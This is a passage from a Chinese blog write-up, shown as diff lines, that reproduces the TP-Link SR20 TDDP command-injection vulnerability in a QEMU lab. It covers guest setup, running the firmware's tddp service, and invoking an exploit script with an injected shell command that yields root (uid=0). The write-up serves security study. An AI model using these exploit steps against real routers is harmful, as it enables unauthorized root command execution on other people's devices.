+<p>&#x2F;&#x2F; scp&#x2F;ssh 需要密码（串口空密码 ≠ SSH 允许空密码）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /etc/ssh/sshd_config.d</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;PermitRootLogin yes&#x27;</span> &gt; /etc/ssh/sshd_config.d/99-root-pass.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;PasswordAuthentication yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config.d/99-root-pass.conf</span><br><span class="line">sshd -t &amp;&amp; systemctl restart ssh</span><br></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F; 允许 root 密码登录；改完重启 ssh</p>
+<p>DNS（apt&#x2F;wget 需要）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -f /etc/resolv.conf</span><br><span class="line"><span class="built_in">echo</span> nameserver 8.8.8.8 &gt; /etc/resolv.conf</span><br><span class="line"><span class="built_in">echo</span> nameserver 1.1.1.1 &gt;&gt; /etc/resolv.conf</span><br><span class="line"><span class="built_in">echo</span> nameserver 10.0.2.3 &gt;&gt; /etc/resolv.conf</span><br><span class="line"><span class="built_in">cat</span> /etc/resolv.conf</span><br></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F; 去掉 stub；三条静态 DNS；不要用 printf 粘贴</p>
+<img src="/images/newpapername/Pasted-image-20261004212809.png" alt="Pasted image 20261004212809" width="388" />
+
+<h2 id="e-传文件（二选一，不是先后）"><a href="#e-传文件（二选一，不是先后）" class="headerlink" title="e.传文件（二选一，不是先后）"></a>e.传文件（二选一，不是先后）</h2><h3 id="方案-A-·-scp（SSH-已通时）"><a href="#方案-A-·-scp（SSH-已通时）" class="headerlink" title="方案 A · scp（SSH 已通时）"></a>方案 A · scp（SSH 已通时）</h3><p>主机新开终端：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 2222 D:/iot/CASE-0002-repro.tgz root@127.0.0.1:/root/</span><br></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F; 经 SSH 推进客机 &#x2F;root；-P 大写</p>
+<p><img src="/images/newpapername/Pasted-image-20261004212931.png" alt="Pasted image 20261004212931"><br>客机确认：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -lh /root/CASE-0002-repro.tgz</span><br></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F; 大约 18M</p>
+<img src="/images/newpapername/Pasted-image-20261004212951.png" alt="Pasted image 20261004212951" width="217" />
+
+<p>登录客机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 2222 root@127.0.0.1</span><br></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F; -p 小写</p>
+<h3 id="方案-B-·-HTTP（SSH-还没好时）"><a href="#方案-B-·-HTTP（SSH-还没好时）" class="headerlink" title="方案 B · HTTP（SSH 还没好时）"></a>方案 B · HTTP（SSH 还没好时）</h3><p>主机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> D:/iot</span><br><span class="line">python3 -m http.server 8000 --<span class="built_in">bind</span> 0.0.0.0</span><br></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F; 当前目录当网站根；终端挂着</p>
+<p>客机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O /root/CASE-0002-repro.tgz http://10.0.2.2:8000/CASE-0002-repro.tgz</span><br></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F; QEMU user-net 下主机是 10.0.2.2</p>
+<p>怎么选传法<br>已 passwd 且 -s 2222 → 方案 A<br>SSH 还在折腾 → 方案 B</p>
+<h2 id="f-解包"><a href="#f-解包" class="headerlink" title="f.解包"></a>f.解包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">tar -xzf CASE-0002-repro.tgz</span><br><span class="line"><span class="built_in">ls</span> CASE-0002</span><br></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F; 应看到 unpack、exp、docs 等</p>
+<img src="/images/newpapername/Pasted-image-20261004213033.png" alt="Pasted image 20261004213033" width="362" />
+
+<h1 id="8-本地复现（qemu-user）"><a href="#8-本地复现（qemu-user）" class="headerlink" title="8.本地复现（qemu-user）"></a>8.本地复现（qemu-user）</h1><h2 id="a-起服务（必须在-rootfs-里）"><a href="#a-起服务（必须在-rootfs-里）" class="headerlink" title="a.起服务（必须在 rootfs 里）"></a>a.起服务（必须在 rootfs 里）</h2><p>先find找一下<br><img src="/images/newpapername/Pasted-image-20261005201028.png" alt="Pasted image 20261005201028" width="317" /></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ROOT=./CASE-0002/unpack/sr20/squashfs-root/rootfs/</span><br><span class="line"><span class="built_in">ls</span> <span class="string">&quot;<span class="variable">$ROOT</span>/tddp&quot;</span></span><br><span class="line">// 确认二进制在</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$ROOT</span>&quot;</span></span><br><span class="line">// 必须进 rootfs；./usr/bin/tddp 是相对路径</span><br><span class="line"></span><br><span class="line">qemu-arm-static -L <span class="string">&quot;<span class="variable">$ROOT</span>&quot;</span> <span class="string">&quot;<span class="variable">$ROOT</span>/usr/bin/tddp&quot;</span> &gt;/tmp/tddp.log 2&gt;&amp;1 &amp;</span><br><span class="line">// -L 解析 uClibc</span><br><span class="line"></span><br><span class="line">ss -ulnp | grep 1040</span><br><span class="line">// 必须先看到 0.0.0.0:1040 再发包</span><br></pre></td></tr></table></figure>
+
+<h2 id="b-打-PoC"><a href="#b-打-PoC" class="headerlink" title="b.打 PoC"></a>b.打 PoC</h2><p>先起好 tddp（§8.a），<code>ss</code> 已见 1040。下面只选一条。</p>
+<p>脚本都是 <strong>AI 写的 helper</strong>（<code>sr20_tddp_rce.py</code>）</p>
+<h3 id="方案-A-·-客机本机打（最省事）"><a href="#方案-A-·-客机本机打（最省事）" class="headerlink" title="方案 A · 客机本机打（最省事）"></a>方案 A · 客机本机打（最省事）</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">谁发包：客机 python</span><br><span class="line">谁中招：客机 tddp</span><br><span class="line">要不要 UDP 转发：不要</span><br><span class="line">开机：debvm-run -i arm64-debug.ext4 -s 2222   即可</span><br></pre></td></tr></table></figure>
+
+<p>（客机里）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /root/CASE-0002/exp/sr20_tddp_rce.py 127.0.0.1 <span class="string">&#x27;id&gt;/tmp/iot_sr20_id.txt&#x27;</span> --mode amp</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /tmp/iot_sr20_id.txt</span><br></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F; 成功应有 uid&#x3D;0</p>
+<p><img src="/images/newpapername/Pasted-image-20261005202146.png" alt="Pasted image 20261005202146"></p>
+<h3 id="方案-B-·-主机发包-客机触发"><a href="#方案-B-·-主机发包-客机触发" class="headerlink" title="方案 B · 主机发包 &#x2F; 客机触发"></a>方案 B · 主机发包 &#x2F; 客机触发</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">谁发包：主机 python</span><br><span class="line">谁中招：客机 tddp</span><br><span class="line">要不要 UDP 转发：要</span><br><span class="line">开机：debvm-run -i arm64-debug.ext4 -s 2222 --netopt hostfwd=udp:127.0.0.1:1040-:1040</span><br></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F; 详见 §7.c；与方案 A 的开机差在 udp hostfwd</p>
+<p>（客机）仍按 §8.a 起 tddp，确认 1040 在听。</p>
+<p>（主机）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 D:/iot/cases/CASE-0002/exp/sr20_tddp_rce.py 127.0.0.1 <span class="string">&#x27;id&gt;/tmp/iot_sr20_id.txt&#x27;</span> --mode amp</span><br></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F; 打主机本机 1040，QEMU 转到客机</p>
+<p><img src="/images/newpapername/Pasted-image-20261005202416.png" alt="Pasted image 20261005202416"></p>
+<p>（客机）<img src="/images/newpapername/Pasted-image-20261005204350.png" alt="Pasted image 20261005204350"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /tmp/iot_sr20_id.txt</span><br></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F; 证据仍在客机<br><img src="/images/newpapername/Pasted-image-20261005204350.png" alt="Pasted image 20261005204350"></p>
+<h3 id="怎么选"><a href="#怎么选" class="headerlink" title="怎么选"></a>怎么选</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">只想尽快证明洞	→ 方案 A</span><br><span class="line">想模拟「外机打进来」	→ 方案 B</span><br><span class="line">SSH 都还没好	→ 先 A（全程可在串口做）</span><br></pre></td></tr></table></figure>
+
+<h2 id="c-成功判据（两方案相同）"><a href="#c-成功判据（两方案相同）" class="headerlink" title="c.成功判据（两方案相同）"></a>c.成功判据（两方案相同）</h2><ul>
+<li><code>ss</code> 见 UDP 1040  </li>
+<li><code>/tmp/iot_sr20_id.txt</code> 含 <code>uid=</code>  </li>
+<li><code>tftp: not found</code> &#x2F; <code>127.0.0.1: not found</code> 可忽略</li>
+</ul>
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/categories/IoT/" title="IoT" data-aos="zoom-in">IoT</a>
+
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/IoT/" rel="tag" title="IoT">IoT</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/TDDP/" rel="tag" title="TDDP">TDDP</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag" title="漏洞复现">漏洞复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2026
+        <span class="footer-info-sep rotate"></span>
+      爱瞎捣鼓的xibao
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        3.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        00:19
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E%E4%B8%8E%E8%AF%B4%E6%98%8E"><span class="toc-number">1.</span> <span class="toc-text">免责声明与说明</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E4%B8%8B%E8%BD%BD%E5%9B%BA%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text">1.下载固件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%8F%96%E5%87%BArootfs"><span class="toc-number">3.</span> <span class="toc-text">2.取出rootfs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#a-%E5%85%88file-%E4%B8%80%E4%B8%8B%E6%96%87%E4%BB%B6"><span class="toc-number">3.1.</span> <span class="toc-text">a.先file 一下文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b-binwalk-%E4%B8%80%E4%B8%8B%EF%BC%8C"><span class="toc-number">3.2.</span> <span class="toc-text">b.binwalk  一下，</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#c-dd%E5%BE%97%E5%88%B0%E9%95%9C%E5%83%8F"><span class="toc-number">3.3.</span> <span class="toc-text">c.dd得到镜像</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#d-%E5%BE%97%E5%88%B0rootfs%E6%96%87%E4%BB%B6"><span class="toc-number">3.4.</span> <span class="toc-text">d.得到rootfs文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E6%89%BE%E5%88%B0%E6%BC%8F%E6%B4%9E%E7%A8%8B%E5%BA%8F"><span class="toc-number">4.</span> <span class="toc-text">3.找到漏洞程序</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#a-%E6%9F%A5%E7%9C%8B%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="toc-number">4.1.</span> <span class="toc-text">a.查看开机启动项</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E4%B8%80%E9%83%A8%E5%88%86%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">5.</span> <span class="toc-text">4.一部分前置知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#a-%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%9C%A8%E5%B9%B2%E4%BB%80%E4%B9%88%EF%BC%88%E4%B8%80%E5%8F%A5%E8%AF%9D%EF%BC%89"><span class="toc-number">5.1.</span> <span class="toc-text">a.本漏洞在干什么（一句话）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b-%E5%8D%8F%E8%AE%AE%E5%A4%B4%EF%BC%88v1%EF%BC%8C12-%E5%AD%97%E8%8A%82%EF%BC%89"><span class="toc-number">5.2.</span> <span class="toc-text">b.协议头（v1，12 字节）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#c-%E7%AB%AF%E5%8F%A3%E4%B8%8E%E7%A8%8B%E5%BA%8F"><span class="toc-number">5.3.</span> <span class="toc-text">c.端口与程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#d-%E4%B8%BA%E4%BB%80%E4%B9%88-%E4%B8%8D%E8%A1%8C%E3%80%81-%E8%A1%8C"><span class="toc-number">5.4.</span> <span class="toc-text">d.为什么 ; 不行、&amp;&#x2F;| 行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#e-%E4%B8%A4%E5%A5%97%E5%A4%8D%E7%8E%B0%E8%B7%AF%E5%BE%84"><span class="toc-number">5.5.</span> <span class="toc-text">e.两套复现路径</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-%E6%9F%A5%E6%89%BE%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.</span> <span class="toc-text">5.查找漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%EF%BC%88%E4%BE%BF%E4%BA%8E%E5%9B%9E%E7%9C%8B%EF%BC%89"><span class="toc-number">6.1.</span> <span class="toc-text">调用链（便于回看）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99"><span class="toc-number">7.</span> <span class="toc-text">6.脚本编写</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#a-%E6%80%9D%E8%B7%AF"><span class="toc-number">7.1.</span> <span class="toc-text">a.思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b-%E8%84%9A%E6%9C%AC"><span class="toc-number">7.2.</span> <span class="toc-text">b.脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88-A-%C2%B7-AI-%E5%86%99%E7%9A%84%E5%AE%8C%E6%95%B4-helper%EF%BC%88%E6%8E%A8%E8%8D%90%E6%97%A5%E5%B8%B8%EF%BC%89"><span class="toc-number">7.2.1.</span> <span class="toc-text">方案 A · AI 写的完整 helper（推荐日常）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88-B-%C2%B7-%E8%87%AA%E5%B7%B1%E5%AF%B9%E7%85%A7%E5%86%99%E7%9A%84%E6%9E%81%E7%AE%80%E7%89%88"><span class="toc-number">7.2.2.</span> <span class="toc-text">方案 B · 自己对照写的极简版</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#c-%E8%B0%83%E7%94%A8%EF%BC%88%E4%B8%8E%E4%B8%8A%E8%8A%82%E6%96%B9%E6%A1%88%E5%AF%B9%E5%BA%94%EF%BC%9B%E6%89%93%E6%B3%95%E8%A7%81-%C2%A78%EF%BC%89"><span class="toc-number">7.3.</span> <span class="toc-text">c.调用（与上节方案对应；打法见 §8）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BC%A0%E6%96%87%E4%BB%B6%EF%BC%88ARM64-%E8%B0%83%E8%AF%95%E6%9C%BA%EF%BC%89"><span class="toc-number">8.</span> <span class="toc-text">7.环境配置与传文件（ARM64 调试机）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#a-%E4%B8%BB%E6%9C%BA%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%EF%BC%88debvm-%E7%AD%89%EF%BC%89"><span class="toc-number">8.1.</span> <span class="toc-text">a.主机工具安装（debvm 等）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b-%E5%87%86%E5%A4%87%E8%B5%84%E4%BA%A7%EF%BC%88%E4%B8%BB%E6%9C%BA%E6%A1%8C%E9%9D%A2%EF%BC%89"><span class="toc-number">8.2.</span> <span class="toc-text">b.准备资产（主机桌面）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#c-%E5%BC%80%E6%9C%BA"><span class="toc-number">8.3.</span> <span class="toc-text">c.开机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#d-%E5%AE%A2%E6%9C%BA%E4%B8%80%E6%AC%A1%E9%85%8D%E7%BD%AE%EF%BC%88%E5%86%99%E5%85%A5%E7%A3%81%E7%9B%98%EF%BC%8C%E4%B8%8B%E6%AC%A1%E8%BF%98%E5%9C%A8%EF%BC%89"><span class="toc-number">8.4.</span> <span class="toc-text">d.客机一次配置（写入磁盘，下次还在）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#e-%E4%BC%A0%E6%96%87%E4%BB%B6%EF%BC%88%E4%BA%8C%E9%80%89%E4%B8%80%EF%BC%8C%E4%B8%8D%E6%98%AF%E5%85%88%E5%90%8E%EF%BC%89"><span class="toc-number">8.5.</span> <span class="toc-text">e.传文件（二选一，不是先后）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88-A-%C2%B7-scp%EF%BC%88SSH-%E5%B7%B2%E9%80%9A%E6%97%B6%EF%BC%89"><span class="toc-number">8.5.1.</span> <span class="toc-text">方案 A · scp（SSH 已通时）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88-B-%C2%B7-HTTP%EF%BC%88SSH-%E8%BF%98%E6%B2%A1%E5%A5%BD%E6%97%B6%EF%BC%89"><span class="toc-number">8.5.2.</span> <span class="toc-text">方案 B · HTTP（SSH 还没好时）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#f-%E8%A7%A3%E5%8C%85"><span class="toc-number">8.6.</span> <span class="toc-text">f.解包</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0%EF%BC%88qemu-user%EF%BC%89"><span class="toc-number">9.</span> <span class="toc-text">8.本地复现（qemu-user）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#a-%E8%B5%B7%E6%9C%8D%E5%8A%A1%EF%BC%88%E5%BF%85%E9%A1%BB%E5%9C%A8-rootfs-%E9%87%8C%EF%BC%89"><span class="toc-number">9.1.</span> <span class="toc-text">a.起服务（必须在 rootfs 里）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b-%E6%89%93-PoC"><span class="toc-number">9.2.</span> <span class="toc-text">b.打 PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88-A-%C2%B7-%E5%AE%A2%E6%9C%BA%E6%9C%AC%E6%9C%BA%E6%89%93%EF%BC%88%E6%9C%80%E7%9C%81%E4%BA%8B%EF%BC%89"><span class="toc-number">9.2.1.</span> <span class="toc-text">方案 A · 客机本机打（最省事）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88-B-%C2%B7-%E4%B8%BB%E6%9C%BA%E5%8F%91%E5%8C%85-%E5%AE%A2%E6%9C%BA%E8%A7%A6%E5%8F%91"><span class="toc-number">9.2.2.</span> <span class="toc-text">方案 B · 主机发包 &#x2F; 客机触发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E9%80%89"><span class="toc-number">9.2.3.</span> <span class="toc-text">怎么选</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#c-%E6%88%90%E5%8A%9F%E5%88%A4%E6%8D%AE%EF%BC%88%E4%B8%A4%E6%96%B9%E6%A1%88%E7%9B%B8%E5%90%8C%EF%BC%89"><span class="toc-number">9.3.</span> <span class="toc-text">c.成功判据（两方案相同）</span></a></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="爱瞎捣鼓的xibao" class="lazyload">
+  <div class="sidebar-author-name">爱瞎捣鼓的xibao</div>
+  <div class="sidebar-description">笔记与漏洞复现</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "爱瞎捣鼓的xibao",
+          title: "TP-Link SR20 TDDP 漏洞案例复现",
+          url: "https://aixiadaogudexibao.github.io/2026/10/09/newpapername/",
+          excerpt: "",
+          description: "",
+          stripContent: "免责声明与说明 免责声明 本文仅用于 网络安全学习、固件分析与漏洞原理研究，所有操作均在作者自建的本地&amp;#x2F;虚拟环境中完成。禁止将文中方法、脚本用于未授权设备、生产网络或任何违法用途。若因滥用本文内容造成损失或法律后果，作者与转载平台 不承担任何责任；读者应自行遵守所在地法律法规与厂商授权范围。   关于 AI 辅助 本文主体为作者实操复现与笔记整理；其中 部分协议梳理、脚本辅助、文字润色与结构归纳由 AI 生成&amp;#x2F;协助完成，并经作者核对后收录。代码、命令与截图请以可复现环境中的实",
+          date: "Fri Oct 09 2026 17:29:19 GMT+0800",
+          updated: "Fri Oct 09 2026 19:19:19 GMT+0800",
+          cover: "/images/newpapername/Pasted-image-20260928192933.png",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
